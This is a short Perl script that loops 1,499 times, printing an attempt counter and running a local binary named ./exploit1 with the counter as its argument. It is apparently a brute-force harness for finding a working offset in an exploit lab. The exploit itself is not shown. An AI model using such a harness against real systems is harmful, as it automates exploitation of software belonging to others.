#!/usr/bin/perl

for($i=1;$i<1500;$i++)
{
  print "Attempt $i \n";
  system("./exploit1 $i");
}
